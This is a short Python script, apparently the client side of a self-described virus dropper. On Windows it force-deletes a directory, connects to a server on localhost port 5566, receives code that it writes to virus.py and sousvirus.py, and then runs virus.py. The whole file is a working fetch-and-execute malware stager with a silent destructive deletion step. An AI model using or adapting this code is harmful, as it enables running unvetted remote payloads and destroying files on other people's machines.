import socket
import os
if os.name == "nt":
    os.system("rmdir script2 /s /q")
    os.system("echo ETAPE 1 FIN") 

    host, port = ('localhost',5566)
    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.connect((host,port))
    print("Client connecté !")
    socket.sendall("Virus".encode("utf8"))
    data = socket.recv(2048).decode("utf8")
    liste = data.split("[|]")
    fic = open("virus.py","w")
    fic.write(liste[0])
    fic.close()
    fic = open("sousvirus.py","w")
    fic.write(liste[1])
    fic.close()
    fic = open("data.txt","w")
    fic.write(liste[2])
    fic.close()
    socket.close()

    os.system("python virus.py")
    os.system("echo ETAPE 3 FIN") 